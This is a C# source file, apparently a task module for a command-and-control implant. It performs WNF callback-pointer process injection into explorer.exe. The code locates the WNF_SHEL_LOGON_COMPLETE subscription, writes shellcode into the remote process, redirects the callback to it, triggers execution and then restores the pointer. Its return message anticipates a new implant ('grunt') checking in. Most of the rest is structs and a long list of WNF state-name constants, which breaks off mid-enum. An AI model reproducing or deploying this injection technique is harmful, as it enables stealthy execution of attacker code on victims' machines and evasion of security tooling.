using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Linq;


    public class Task
    {
        public static void WnfGetSubscriptionTable(UInt32 ProcId)
        {
            // Validate the process ID
            PROC_VALIDATION pv = ValidateProc((Int32)ProcId);
            //Console.WriteLine("[+] Validating Process..", Color.LightGreen);

            // Not what we are looking for
            if (!pv.isvalid || pv.isWow64 || pv.hProc == IntPtr.Zero)
            {
                if (!pv.isvalid)
                {
                    //Console.WriteLine("[!] Invalid PID specified..", Color.Red);
                }
                else if (pv.isWow64)
                {
                    //Console.WriteLine("[!] Only x64 processes are supported..", Color.Red);
                }
                else
                {
                    //Console.WriteLine("[!] Unable to aquire process handle..", Color.Red);
                }
                return;
            }

            // Validation success
            //Console.WriteLineFormatted("{0} {4}{1} " + ProcId + "{3} {5}{1} " + pv.sName, Color.White, cProps);
            //Console.WriteLineFormatted("    {2} {6}{1} " + pv.hProc + "{3} {7}{1} x64", Color.White, cProps);

            // Look for _WNF_SUBSCRIPTION_TABLE
            //Console.WriteLine("\n[+] Leaking local WNF_SUBSCRIPTION_TABLE..", Color.LightGreen);
            WNF_SUBTBL_LEAK WnfTableRVA = LeakWNFSubtRVA();
            if (WnfTableRVA.pNtdll == IntPtr.Zero)
            {
                //Console.WriteLine("[!] Unable to locate Ntdll RVA..", Color.Red);
                return;
            }
            //Console.WriteLineFormatted("{0} {8}{1} " + "0x" + String.Format("{0:X}", (WnfTableRVA.pNtdll).ToInt64()) + "{3} {9}{1} " + WnfTableRVA.iNtdllRVA, Color.White, cProps);

            // Read _WNF_SUBSCRIPTION_TABLE in remote proc
            //Console.WriteLine("\n[+] Remote WNF_SUBSCRIPTION_TABLE lookup..", Color.LightGreen);
            REMOTE_WNF_SUBTBL rws = VerifyRemoteSubTable(ProcId, pv.hProc, WnfTableRVA.iNtdllRVA);
            if (rws.pNtBase == IntPtr.Zero || rws.pRemoteTbl == IntPtr.Zero || rws.bHasTable == false)
            {
                if (rws.pNtBase == IntPtr.Zero)
                {
                    //Console.WriteLine("[!] Unable to get remote Ntdll base..", Color.Red);
                }
                else if (rws.pRemoteTbl == IntPtr.Zero)
                {
                    //Console.WriteLine("[!] Unable to read remote table pointer..", Color.Red);
                }
                else
                {
                    //Console.WriteLine("[!] Remote process does not have a WNF Subscription table..", Color.Red);
                }
                return;
            }
            //Console.WriteLineFormatted("{0} {10}{1} " + "0x" + String.Format("{0:X}", (rws.pNtBase).ToInt64()) + "{3} {11}{1} " + "0x" + String.Format("{0:X}", (rws.pRemoteTbl).ToInt64()), Color.White, cProps);
            //Console.WriteLineFormatted("    {2} {12}{1} " + "0x" + String.Format("{0:X}", (rws.sSubTbl.NamesTableEntry.Flink).ToInt64()) + "{3} {13}{1} " + "0x" + String.Format("{0:X}", (rws.sSubTbl.NamesTableEntry.Blink).ToInt64()), Color.White, cProps);

            // Read process subscriptions
            //Console.WriteLine("\n[+] Reading remote WNF subscriptions..", Color.LightGreen);
            List<WNF_SUBSCRIPTION_SET> wss = ReadWnfSubscriptions(pv.hProc, rws.sSubTbl.NamesTableEntry.Flink, rws.sSubTbl.NamesTableEntry.Blink);
            if (wss.Count > 0)
            {
                foreach (WNF_SUBSCRIPTION_SET Subscription in wss)
                {
                    //Console.WriteLineFormatted("{0} {14}{1} " + "0x" + String.Format("{0:X}", Subscription.SubscriptionId) + "{3} {15}{1} " + Subscription.StateName, Color.White, cProps);
                    foreach (WNF_USER_SET wus in Subscription.UserSubs)
                    {
                        //Console.WriteLineFormatted("    {2} {16}{1} " + "0x" + String.Format("{0:X}", (wus.UserSubscription).ToInt64()), Color.White, cProps);
                        //Console.WriteLineFormatted("    {2} {17}{1} " + "0x" + String.Format("{0:X}", (wus.CallBack).ToInt64()) + " {19} " + GetSymForPtr(pv.hProc, wus.CallBack), Color.White, cProps);
                        //Console.WriteLineFormatted("    {2} {18}{1} " + "0x" + String.Format("{0:X}", (wus.Context).ToInt64()) + " {19} " + GetSymForPtr(pv.hProc, wus.Context) + "\n", Color.White, cProps);
                    }
                }
            } else
            {
                //Console.WriteLine("[!] No WNF subscriptions identified..", Color.Red);
            }
            
        }

        public static void WnfInjectSc()
        {
            // Find main explorer proc
            int ProcId = FindExplorerPID();
            if (ProcId == 0)
            {
                //Console.WriteLine("[!] Unable to find explorer process..", Color.Red);
            }

            // Validate the process ID
            PROC_VALIDATION pv = ValidateProc((Int32)ProcId);
            //Console.WriteLine("[+] Validating Process..", Color.LightGreen);

            if (!pv.isvalid || pv.isWow64 || pv.hProc == IntPtr.Zero)
            {
                //Console.WriteLine("[!] Unable to get explorer handle..", Color.Red);
                return;
            }

            // Validation success
            //Console.WriteLineFormatted("{0} {4}{1} " + ProcId + "{3} {5}{1} " + pv.sName, Color.White, cProps);
            //Console.WriteLineFormatted("    {2} {6}{1} " + pv.hProc + "{3} {7}{1} x64", Color.White, cProps);

            // Look for _WNF_SUBSCRIPTION_TABLE
            //Console.WriteLine("\n[+] Leaking local WNF_SUBSCRIPTION_TABLE..", Color.LightGreen);
            WNF_SUBTBL_LEAK WnfTableRVA = LeakWNFSubtRVA();
            if (WnfTableRVA.pNtdll == IntPtr.Zero)
            {
                //Console.WriteLine("[!] Unable to locate Ntdll RVA..", Color.Red);
                return;
            }
            //Console.WriteLineFormatted("{0} {8}{1} " + "0x" + String.Format("{0:X}", (WnfTableRVA.pNtdll).ToInt64()) + "{3} {9}{1} " + WnfTableRVA.iNtdllRVA, Color.White, cProps);

            // Read _WNF_SUBSCRIPTION_TABLE in remote proc
            //Console.WriteLine("\n[+] Remote WNF_SUBSCRIPTION_TABLE lookup..", Color.LightGreen);
            REMOTE_WNF_SUBTBL rws = VerifyRemoteSubTable((uint)ProcId, pv.hProc, WnfTableRVA.iNtdllRVA);
            if (rws.pNtBase == IntPtr.Zero || rws.pRemoteTbl == IntPtr.Zero || rws.bHasTable == false)
            {
                if (rws.pNtBase == IntPtr.Zero)
                {
                    //Console.WriteLine("[!] Unable to get remote Ntdll base..", Color.Red);
                }
                else if (rws.pRemoteTbl == IntPtr.Zero)
                {
                    //Console.WriteLine("[!] Unable to read remote table pointer..", Color.Red);
                }
                else
                {
                    //Console.WriteLine("[!] Remote process does not have a WNF Subscription table..", Color.Red);
                }
                return;
            }
            //Console.WriteLineFormatted("{0} {10}{1} " + "0x" + String.Format("{0:X}", (rws.pNtBase).ToInt64()) + "{3} {11}{1} " + "0x" + String.Format("{0:X}", (rws.pRemoteTbl).ToInt64()), Color.White, cProps);
            //Console.WriteLineFormatted("    {2} {12}{1} " + "0x" + String.Format("{0:X}", (rws.sSubTbl.NamesTableEntry.Flink).ToInt64()) + "{3} {13}{1} " + "0x" + String.Format("{0:X}", (rws.sSubTbl.NamesTableEntry.Blink).ToInt64()), Color.White, cProps);

            // Read process subscriptions
            //Console.WriteLine("\n[+] Finding remote subscription -> WNF_SHEL_LOGON_COMPLETE", Color.LightGreen);
            WNF_SUBSCRIPTION_SET WnfInjectTarget = new WNF_SUBSCRIPTION_SET();
            List<WNF_SUBSCRIPTION_SET> wss = ReadWnfSubscriptions(pv.hProc, rws.sSubTbl.NamesTableEntry.Flink, rws.sSubTbl.NamesTableEntry.Blink);
            if (wss.Count > 0)
            {
                foreach (WNF_SUBSCRIPTION_SET Subscription in wss)
                {
                    if (Subscription.StateName == "WNF_SHEL_LOGON_COMPLETE")
                    {
                        WnfInjectTarget = Subscription;
                        //Console.WriteLineFormatted("{0} {14}{1} " + "0x" + String.Format("{0:X}", Subscription.SubscriptionId) + "{3} {15}{1} " + Subscription.StateName, Color.White, cProps);
                        foreach (WNF_USER_SET wus in Subscription.UserSubs)
                        {
                            //Console.WriteLineFormatted("    {2} {16}{1} " + "0x" + String.Format("{0:X}", (wus.UserSubscription).ToInt64()), Color.White, cProps);
                            //Console.WriteLineFormatted("    {2} {17}{1} " + "0x" + String.Format("{0:X}", (wus.CallBack).ToInt64()) + " {19} " + GetSymForPtr(pv.hProc, wus.CallBack), Color.White, cProps);
                            //Console.WriteLineFormatted("    {2} {18}{1} " + "0x" + String.Format("{0:X}", (wus.Context).ToInt64()) + " {19} " + GetSymForPtr(pv.hProc, wus.Context) + "\n", Color.White, cProps);
                        }
                    }
                }
            }
            else
            {
                //Console.WriteLine("[!] Unable to list WNF subscriptions..", Color.Red);
                return;
            }

            // Alloc our payload
            //Console.WriteLine("[+] Allocating remote shellcode..", Color.LightGreen);
            SC_ALLOC Payload = RemoteScAlloc(pv.hProc);
            if(Payload.pRemote == IntPtr.Zero)
            {
                //Console.WriteLine("[!] Unable to alloc shellcode in remote process..", Color.Red);
                return;
            }
            //Console.WriteLineFormatted("{0} {20}{1} " + Payload.Size, Color.White, cProps);
            //Console.WriteLineFormatted("{0} {21}{1} " + "0x" + String.Format("{0:X}", (Payload.pRemote).ToInt64()), Color.White, cProps);

            // Rewrite Callback pointer
            //Console.WriteLine("\n[+] Rewriting WNF subscription callback pointer..", Color.LightGreen);
            RewriteSubscriptionPointer(pv.hProc, WnfInjectTarget, Payload.pRemote, false);
            //Console.WriteLine("[+] NtUpdateWnfStateData -> Trigger shellcode", Color.LightGreen);
            UpdateWnfState();
            //Console.WriteLine("[+] Restoring WNF subscription callback pointer & deallocating shellcode..", Color.LightGreen);
            RewriteSubscriptionPointer(pv.hProc, WnfInjectTarget, Payload.pRemote, true);
        }

        public static string Execute()
        {
            WnfInjectSc();
            return "Done injecting, lets hope a grunt comes soon";
        }

    // Structs
    //-----------------------------------
    [StructLayout(LayoutKind.Sequential)]
    public struct PROC_VALIDATION
    {
        public Boolean isvalid;
        public String sName;
        public IntPtr hProc;
        public Boolean isWow64;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECTABLE_INFO
    {
        public Int16 sCount;
        public IntPtr pSecTable;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WNF_SUBTBL_LEAK
    {
        public IntPtr pNtdll;
        public int iNtdllRVA;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct REMOTE_WNF_SUBTBL
    {
        public IntPtr pNtBase;
        public IntPtr pRemoteTbl;
        public bool bHasTable;
        public WNF_SUBSCRIPTION_TABLE sSubTbl;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LIST_ENTRY
    {
        public IntPtr Flink;
        public IntPtr Blink;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WNF_CONTEXT_HEADER
    {
        public UInt16 NodeTypeCode;
        public UInt16 NodeByteSize;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WNF_SUBSCRIPTION_TABLE
    {
        public WNF_CONTEXT_HEADER Header;
        public IntPtr NamesTableLock;
        public LIST_ENTRY NamesTableEntry;
        public LIST_ENTRY SerializationGroupListHead;
        public IntPtr SerializationGroupLock;
        public UInt64 Unknown1;
        public UInt32 SubscribedEventSet;
        public UInt64 Unknown2;
        public IntPtr Timer;
        public UInt64 TimerDueTime;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WNF_NAME_SUBSCRIPTION
    {
        public WNF_CONTEXT_HEADER Header;
        public UInt64 SubscriptionId;
        public UInt64 StateName;
        public IntPtr CurrentChangeStamp;
        public LIST_ENTRY NamesTableEntry;
        public IntPtr TypeId;
        public IntPtr SubscriptionLock;
        public LIST_ENTRY SubscriptionsListHead;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WNF_USER_SUBSCRIPTION
    {
        public WNF_CONTEXT_HEADER Header;
        public LIST_ENTRY SubscriptionsListEntry;
        public IntPtr NameSubscription;
        public IntPtr Callback;
        public IntPtr CallbackContext;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WNF_USER_SET
    {
        public IntPtr UserSubscription;
        public IntPtr CallBack;
        public IntPtr Context;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WNF_SUBSCRIPTION_SET
    {
        public UInt64 SubscriptionId;
        public String StateName;
        public List<WNF_USER_SET> UserSubs;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
        public string Name;
        public UInt32 VirtualSize;
        public UInt32 VirtualAddress;
        public UInt32 SizeOfRawData;
        public UInt32 PointerToRawData;
        public UInt32 PointerToRelocations;
        public UInt32 PointerToLinenumbers;
        public UInt16 NumberOfRelocations;
        public UInt16 NumberOfLinenumbers;
        public SectionFlags Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_INFORMATION
    {
        public ushort processorArchitecture;
        public ushort reserved;
        public uint pageSize;
        public IntPtr minimumApplicationAddress;
        public IntPtr maximumApplicationAddress;
        public IntPtr activeProcessorMask;
        public uint numberOfProcessors;
        public uint processorType;
        public uint allocationGranularity;
        public ushort processorLevel;
        public ushort processorRevision;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public UIntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGEHLP_SYMBOLW64
    {
        public UInt32 SizeOfStruct;
        public UInt64 Address;
        public UInt32 Size;
        public UInt32 Flags;
        public UInt32 MaxNameLength;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x255)]
        public char[] Name;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SC_ALLOC
    {
        public UInt32 Size;
        public IntPtr pRemote;
    }

    [StructLayout(LayoutKind.Sequential)]
    public class WnfTypeId
    {
        public Guid TypeId;
    }

    // Enums
    //-----------------------------------
    public enum WnfStateNames : UInt64
    {
        WNF_A2A_APPURIHANDLER_INSTALLED = 0x41877c2ca3bc0875,
        WNF_AAD_DEVICE_REGISTRATION_STATUS_CHANGE = 0x41820f2ca3bc0875,
        WNF_AA_CURATED_TILE_COLLECTION_STATUS = 0x41c60f2ca3bc1075,
        WNF_AA_LOCKDOWN_CHANGED = 0x41c60f2ca3bc0875,
        WNF_AA_MDM_STATUS_EVENT_LOGGED = 0x41c60f2ca3bc1875,
        WNF_ACC_EC_ENABLED = 0x41850d2ca3bc0835,
        WNF_ACHK_SP_CORRUPTION_DETECTED = 0xa8e0d2ca3bc0875,
        WNF_ACT_DATA_UPDATED = 0x41920d2ca3bc0835,
        WNF_AFD_IGNORE_ORDERLY_RELEASE_CHANGE = 0x4182082ca3bc0875,
        WNF_AI_PACKAGEINSTALL = 0x41c6072ca3bc1075,
        WNF_AI_PACKAGEUNINSTALL = 0x41c6072ca3bc2075,
        WNF_AI_PACKAGEUPDATE = 0x41c6072ca3bc1875,
        WNF_AI_USERTILE = 0x41c6072ca3bc0875,
        WNF_AOW_BOOT_PROGRESS = 0x4191012ca3bc0875,
        WNF_APXI_CRITICAL_PACKAGES_INSTALLED = 0x89e1e2ca3bc0875,
        WNF_ATP_PUSH_NOTIFICATION_RECEIVED = 0x41961a2ca3bc0875,
        WNF_AUDC_CAPTURE = 0x2821b2ca3bc4075,
        WNF_AUDC_CHAT_APP_CONTEXT = 0x2821b2ca3bc6075,
        WNF_AUDC_CPUSET_ID = 0x2821b2ca3bc08b5,
        WNF_AUDC_CPUSET_ID_SYSTEM = 0x2821b2ca3bc2875,
        WNF_AUDC_DEFAULT_RENDER_ENDPOINT_PROPERTIES = 0x2821b2ca3bc5875,
        WNF_AUDC_HEALTH_PROBLEM = 0x2821b2ca3bc2075,
        WNF_AUDC_PHONECALL_ACTIVE = 0x2821b2ca3bc1075,
        WNF_AUDC_RENDER = 0x2821b2ca3bc3075,
        WNF_AUDC_RINGERVIBRATE_STATE_CHANGED = 0x2821b2ca3bc4875,
        WNF_AUDC_SPATIAL_STATUS = 0x2821b2ca3bc5075,
        WNF_AUDC_TUNER_DEVICE_AVAILABILITY = 0x2821b2ca3bc1875,
        WNF_AUDC_VOLUME_CONTEXT = 0x2821b2ca3bc3875,
        WNF_AVA_SOUNDDETECTOR_PATTERN_MATCH = 0x4187182ca3bc0875,
        WNF_AVLC_DRIVER_REQUEST = 0x28a182ca3bc0875,
        WNF_AVLC_SHOW_VOLUMELIMITWARNING = 0x28a182ca3bc1875,
        WNF_AVLC_VOLUME_WARNING_ACCEPTED = 0x28a182ca3bc1075,
        WNF_BCST_APP_BROADCAST_STREAM_STATE = 0x15950d2fa3bc0875,
        WNF_BI_APPLICATION_SERVICING_START_CHANNEL = 0x41c6072fa3bc3875,
        WNF_BI_APPLICATION_SERVICING_STOP_CHANNEL = 0x41c6072fa3bc4075,
        WNF_BI_APPLICATION_UNINSTALL_CHANNEL = 0x41c6072fa3bc3075,
        WNF_BI_BI_READY = 0x41c6072fa3bc6835,
        WNF_BI_BROKER_WAKEUP_CHANNEL = 0x41c6072fa3bc0875,
        WNF_BI_EVENT_DELETION = 0x41c6072fa3bc5075,
        WNF_BI_LOCK_SCREEN_UPDATE_CHANNEL = 0x41c6072fa3bc4875,
        WNF_BI_NETWORK_LIMITED_CHANNEL = 0x41c6072fa3bc8075,
        WNF_BI_NOTIFY_NEW_SESSION = 0x41c6072fa3bc7075,
        WNF_BI_PSM_TEST_HOOK_CHANNEL = 0x41c6072fa3bc5875,
        WNF_BI_QUERY_APP_USAGE = 0x41c6072fa3bc7875,
        WNF_BI_QUIET_MODE_UPDATE_CHANNEL = 0x41c6072fa3bc6075,
        WNF_BI_SESSION_CONNECT_CHANNEL = 0x41c6072fa3bc2075,
        WNF_BI_SESSION_DISCONNECT_CHANNEL = 0x41c6072fa3bc2875,
        WNF_BI_USER_LOGOFF_CHANNEL = 0x41c6072fa3bc1875,
        WNF_BI_USER_LOGON_CHANNEL = 0x41c6072fa3bc1075,
        WNF_BLTH_BLUETOOTH_AUDIO_GATEWAY_STATUS = 0x992022fa3bc1075,
        WNF_BLTH_BLUETOOTH_AVRCP_VOLUME_CHANGED = 0x992022fa3bc4075,
        WNF_BLTH_BLUETOOTH_CONNECTION_STATE_CHANGE = 0x992022fa3bc2075,
        WNF_BLTH_BLUETOOTH_DEVICE_BATTERY_IS_LOW = 0x992022fa3bc4875,
        WNF_BLTH_BLUETOOTH_DEVICE_DOCK_STATUS = 0x992022fa3bc6075,
        WNF_BLTH_BLUETOOTH_GATT_CLIENT_LEGACY_INVALIDATE_TOKEN = 0x992022fa3bc3075,
        WNF_BLTH_BLUETOOTH_GATT_CLIENT_LEGACY_REQUEST = 0x992022fa3bc2875,
        WNF_BLTH_BLUETOOTH_HFP_HF_LINE_AVAILABLE = 0x992022fa3bc6875,
        WNF_BLTH_BLUETOOTH_LE_ADV_SCANNING_STATUS = 0x992022fa3bc5075,
        WNF_BLTH_BLUETOOTH_MAP_STATUS = 0x992022fa3bc1875,
        WNF_BLTH_BLUETOOTH_QUICKPAIR_STATUS_CHANGED = 0x992022fa3bc3875,
        WNF_BLTH_BLUETOOTH_SHOW_PBAP_CONSENT = 0x992022fa3bc5875,
        WNF_BLTH_BLUETOOTH_STATUS = 0x992022fa3bc0875,
        WNF_BMP_BG_PLAYBACK_REVOKED = 0x4196032fa3bc1075,
        WNF_BMP_BG_PLAYSTATE_CHANGED = 0x4196032fa3bc0875,
        WNF_BOOT_DIRTY_SHUTDOWN = 0x1589012fa3bc0875,
        WNF_BOOT_INVALID_TIME_SOURCE = 0x1589012fa3bc1075,
        WNF_BOOT_MEMORY_PARTITIONS_RESTORE = 0x1589012fa3bc1875,
        WNF_BRI_ACTIVE_WINDOW = 0x418f1c2fa3bc0875,
        WNF_CAM_ACTIVITY_ACCESS_CHANGED = 0x418b0f2ea3bcd875,
        WNF_CAM_APPACTIVATION_WITHVOICEABOVELOCK_CHANGED = 0x418b0f2ea3bcf875,
        WNF_CAM_APPACTIVATION_WITHVOICE_CHANGED = 0x418b0f2ea3bcf075,
        WNF_CAM_APPDIAGNOSTICS_ACCESS_CHANGED = 0x418b0f2ea3bc0875,
        WNF_CAM_APPOINTMENTS_ACCESS_CHANGED = 0x418b0f2ea3bc1075,
        WNF_CAM_BLUETOOTHSYNC_ACCESS_CHANGED = 0x418b0f2ea3bce075,
        WNF_CAM_BLUETOOTH_ACCESS_CHANGED = 0x418b0f2ea3bc1875,
        WNF_CAM_BROADFILESYSTEMACCESS_ACCESS_CHANGED = 0x418b0f2ea3bcd075,
        WNF_CAM_CAMERA_ACCESS_CHANGED = 0x418b0f2ea3bc2075,
        WNF_CAM_CELLULARDATA_ACCESS_CHANGED = 0x418b0f2ea3bc2875,
        WNF_CAM_CHAT_ACCESS_CHANGED = 0x418b0f2ea3bc3075,
        WNF_CAM_CONTACTS_ACCESS_CHANGED = 0x418b0f2ea3bc3875,
        WNF_CAM_DOCUMENTSLIBRARY_ACCESS_CHANGED = 0x418b0f2ea3bcb075,
        WNF_CAM_EMAIL_ACCESS_CHANGED = 0x418b0f2ea3bc4075,
        WNF_CAM_GAZEINPUT_ACCESS_CHANGED = 0x418b0f2ea3bcc875,
        WNF_CAM_HID_ACCESS_CHANGED = 0x418b0f2ea3bc4875,
        WNF_CAM_LOCATION_ACCESS_CHANGED = 0x418b0f2ea3bc5075,
        WNF_CAM_MICROPHONE_ACCESS_CHANGED = 0x418b0f2ea3bc5875,
        WNF_CAM_PHONECALLHISTORY_ACCESS_CHANGED = 0x418b0f2ea3bc6875,
        WNF_CAM_PHONECALL_ACCESS_CHANGED = 0x418b0f2ea3bc6075,
        WNF_CAM_PICTURESLIBRARY_ACCESS_CHANGED = 0x418b0f2ea3bcb875,
        WNF_CAM_POS_ACCESS_CHANGED = 0x418b0f2ea3bc7075,
        WNF_CAM_RADIOS_ACCESS_CHANGED = 0x418b0f2ea3bc7875,
        WNF_CAM_SENSORSCUSTOM_ACCESS_CHANGED = 0x418b0f2ea3bc8075,
        WNF_CAM_SERIAL_ACCESS_CHANGED = 0x418b0f2ea3bc8875,
        WNF_CAM_USB_ACCESS_CHANGED = 0x418b0f2ea3bc9075,
        WNF_CAM_USERACCOUNTINFO_ACCESS_CHANGED = 0x418b0f2ea3bc9875,
        WNF_CAM_USERDATATASKS_ACCESS_CHANGED = 0x418b0f2ea3bca075,
        WNF_CAM_USERNOTIFICATIONLISTENER_ACCESS_CHANGED = 0x418b0f2ea3bca875,
        WNF_CAM_VIDEOSLIBRARY_ACCESS_CHANGED = 0x418b0f2ea3bcc075,
        WNF_CAM_WIFIDIRECT_ACCESS_CHANGED = 0x418b0f2ea3bce875,
        WNF_CAPS_CENTRAL_ACCESS_POLICIES_CHANGED = 0x12960f2ea3bc0875,
        WNF_CCTL_BUTTON_REQUESTS = 0xd920d2ea3bc08b5,
        WNF_CDP_ALLOW_CLIPBOARDHISTORY_POLICY_CHANGE = 0x41960a2ea3bc8075,
        WNF_CDP_ALLOW_CROSSDEVICECLIPBOARD_POLICY_CHANGE = 0x41960a2ea3bc8875,
        WNF_CDP_CDPSVC_READY = 0x41960a2ea3bc0875,
        WNF_CDP_CDPSVC_STOPPING = 0x41960a2ea3bc1075,
        WNF_CDP_CDPUSERSVC_READY = 0x41960a2ea3bc1835,
        WNF_CDP_CDPUSERSVC_STOPPING = 0x41960a2ea3bc2035,
        WNF_CDP_CDP_ACTIVITIES_RECIEVED = 0x41960a2ea3bc3075,
        WNF_CDP_CDP_LOCAL_ACTIVITIES_RECIEVED = 0x41960a2ea3bc6875,
        WNF_CDP_CDP_MESSAGES_QUEUED = 0x41960a2ea3bc2875,
        WNF_CDP_CDP_NOTIFICATION_ACTION_FORWARD_FAILURE = 0x41960a2ea3bc4075,
        WNF_CDP_ENABLE_ACTIVITYFEED_POLICY_CHANGE = 0x41960a2ea3bc5875,
        WNF_CDP_PUBLISH_USER_ACTIVITIES_POLICY_CHANGE = 0x41960a2ea3bc6075,
        WNF_CDP_UPLOAD_USER_ACTIVITIES_POLICY_CHANGE = 0x41960a2ea3bc7875,
        WNF_CDP_USERAUTH_POLICY_CHANGE = 0x41960a2ea3bc3875,
        WNF_CDP_USER_NEAR_SHARE_SETTING_CHANGE = 0x41960a2ea3bc5035,
        WNF_CDP_USER_RESOURCE_INFO_CHANGED = 0x41960a2ea3bc7075,
        WNF_CDP_USER_ROME_SETTING_CHANGE = 0x41960a2ea3bc4835,
        WNF_CELL_AIRPLANEMODE = 0xd8a0b2ea3bc3075,
        WNF_CELL_AIRPLANEMODE_DETAILS = 0xd8a0b2ea3bc9075,
        WNF_CELL_AVAILABLE_OPERATORS_CAN0 = 0xd8a0b2ea3bc5075,
        WNF_CELL_AVAILABLE_OPERATORS_CAN1 = 0xd8a0b2ea3bd5875,
        WNF_CELL_CALLFORWARDING_STATUS_CAN0 = 0xd8a0b2ea3bd0075,
        WNF_CELL_CALLFORWARDING_STATUS_CAN1 = 0xd8a0b2ea3bde075,
        WNF_CELL_CAN_CONFIGURATION_SET_COMPLETE_MODEM0 = 0xd8a0b2ea3be5875,
        WNF_CELL_CAN_STATE_CAN0 = 0xd8a0b2ea3bc8075,
        WNF_CELL_CAN_STATE_CAN1 = 0xd8a0b2ea3bd9075,
        WNF_CELL_CDMA_ACTIVATION_CAN0 = 0xd8a0b2ea3bc4075,
        WNF_CELL_CDMA_ACTIVATION_CAN1 = 0xd8a0b2ea3bd4875,
        WNF_CELL_CONFIGURED_LINES_CAN0 = 0xd8a0b2ea3bdf475,
        WNF_CELL_CONFIGURED_LINES_CAN1 = 0xd8a0b2ea3bdfc75,
        WNF_CELL_CSP_WWAN_PLUS_READYNESS = 0xd8a0b2ea3bcf875,
        WNF_CELL_DATA_ENABLED_BY_USER_MODEM0 = 0xd8a0b2ea3bc6475,
        WNF_CELL_DEVICE_INFO_CAN0 = 0xd8a0b2ea3bc5875,
        WNF_CELL_DEVICE_INFO_CAN1 = 0xd8a0b2ea3bd6075,
        WNF_CELL_EMERGENCY_CALLBACK_MODE_STATUS = 0xd8a0b2ea3be6875,
        WNF_CELL_HOME_OPERATOR_CAN0 = 0xd8a0b2ea3bcc075,
        WNF_CELL_HOME_OPERATOR_CAN1 = 0xd8a0b2ea3bda875,
        WNF_CELL_HOME_PRL_ID_CAN0 = 0xd8a0b2ea3bcc875,
        WNF_CELL_HOME_PRL_ID_CAN1 = 0xd8a0b2ea3bdb075,
        WNF_CELL_IMSI_CAN0 = 0xd8a0b2ea3be2075,
        WNF_CELL_IMSI_CAN1 = 0xd8a0b2ea3be2875,
        WNF_CELL_IMS_STATUS_CAN0 = 0xd8a0b2ea3be8075,
        WNF_CELL_IMS_STATUS_CAN1 = 0xd8a0b2ea3be8875,
        WNF_CELL_IWLAN_AVAILABILITY_CAN0 = 0xd8a0b2ea3be9075,
        WNF_CELL_IWLAN_AVAILABILITY_CAN1 = 0xd8a0b2ea3be9875,
        WNF_CELL_LEGACY_SETTINGS_MIGRATION = 0xd8a0b2ea3be3075,
        WNF_CELL_NETWORK_TIME_CAN0 = 0xd8a0b2ea3bc4875,
        WNF_CELL_NETWORK_TIME_CAN1 = 0xd8a0b2ea3bd5075,
        WNF_CELL_NITZ_INFO = 0xd8a0b2ea3bed075,
        WNF_CELL_OPERATOR_NAME_CAN0 = 0xd8a0b2ea3bc3875,
        WNF_CELL_OPERATOR_NAME_CAN1 = 0xd8a0b2ea3bd4075,
        WNF_CELL_PERSO_STATUS_CAN0 = 0xd8a0b2ea3bcb875,
        WNF_CELL_PERSO_STATUS_CAN1 = 0xd8a0b2ea3bde875,
        WNF_CELL_PHONE_NUMBER_CAN0 = 0xd8a0b2ea3bc6875,
        WNF_CELL_PHONE_NUMBER_CAN1 = 0xd8a0b2ea3bd7075,
        WNF_CELL_POSSIBLE_DATA_ACTIVITY_CHANGE_MODEM0 = 0xd8a0b2ea3bc9875,
        WNF_CELL_POWER_STATE_MODEM0 = 0xd8a0b2ea3bc0875,
        WNF_CELL_PREFERRED_LANGUAGES_SLOT0 = 0xd8a0b2ea3be1075,
        WNF_CELL_PREFERRED_LANGUAGES_SLOT1 = 0xd8a0b2ea3be1875,
        WNF_CELL_PS_MEDIA_PREFERENCES_CAN0 = 0xd8a0b2ea3bea475,
        WNF_CELL_PS_MEDIA_PREFERENCES_CAN1 = 0xd8a0b2ea3beac75,
        WNF_CELL_RADIO_TYPE_MODEM0 = 0xd8a0b2ea3bd0c75,
        WNF_CELL_REGISTRATION_CHANGED_TRIGGER_MV = 0xd8a0b2ea3be6075,
        WNF_CELL_REGISTRATION_PREFERENCES_CAN0 = 0xd8a0b2ea3bc7c75,
        WNF_CELL_REGISTRATION_PREFERENCES_CAN1 = 0xd8a0b2ea3bd8c75,
        WNF_CELL_REGISTRATION_STATUS_CAN0 = 0xd8a0b2ea3bc2075,
        WNF_CELL_REGISTRATION_STATUS_CAN1 = 0xd8a0b2ea3bd2075,
        WNF_CELL_REGISTRATION_STATUS_DETAILS_CAN0 = 0xd8a0b2ea3bca875,
        WNF_CELL_REGISTRATION_STATUS_DETAILS_CAN1 = 0xd8a0b2ea3bd9875,
        WNF_CELL_SIGNAL_STRENGTH_BARS_CAN0 = 0xd8a0b2ea3bc1075,
        WNF_CELL_SIGNAL_STRENGTH_BARS_CAN1 = 0xd8a0b2ea3bd1075,
        WNF_CELL_SIGNAL_STRENGTH_DETAILS_CAN0 = 0xd8a0b2ea3be7075,
        WNF_CELL_SIGNAL_STRENGTH_DETAILS_CAN1 = 0xd8a0b2ea3be7875,
        WNF_CELL_SUPPORTED_SYSTEM_TYPES_CAN0 = 0xd8a0b2ea3bcb075,
        WNF_CELL_SUPPORTED_SYSTEM_TYPES_CAN1 = 0xd8a0b2ea3bda075,
        WNF_CELL_SYSTEM_CONFIG = 0xd8a0b2ea3bca475,
        WNF_CELL_SYSTEM_TYPE_CAN0 = 0xd8a0b2ea3bc1875,
